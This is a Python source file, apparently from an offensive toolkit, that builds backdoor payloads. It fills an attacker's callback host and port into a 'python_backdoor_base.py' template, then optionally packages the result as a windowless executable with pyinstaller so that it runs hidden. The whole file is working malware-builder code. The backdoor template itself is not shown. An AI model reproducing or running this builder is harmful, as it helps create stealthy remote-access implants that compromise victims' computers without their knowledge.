import os

class Payload:
    def __init__(self, lhost, lport, filename):
        self.lhost = lhost
        self.lport = lport
        self.filename = filename

    def create_payload(self, compile=False):
        with open("payload_templates/python_backdoor_base.py", "r") as base:
            base_content = base.read()
            final_payload = base_content.replace("[IP PLACEHOLDER]", self.lhost) 
            if self.lport != 4444:
                final_payload = final_payload.replace("4444", self.lport)
            os.mkdir(f"payloads/{self.filename}")
            with open(f"payloads/{self.filename}/{self.filename}.py", "w") as f:
                f.write(final_payload)
        if compile:
            try:
                os.system(f"pyinstaller --noconsole --onefile --clean --log-level CRITICAL -F --distpath payloads/{self.filename} --workpath payloads/{self.filename}/build --specpath payloads/{self.filename}/build payloads/{self.filename}/{self.filename}.py")
            except:
                print("[-] Requirements not satisfied!\n    run command 'pip install -r requirements.txt' to install requirements")
        print(f"\n        [+] Payload Created at {os.getcwd()}\payloads\{self.filename} [+]\n")
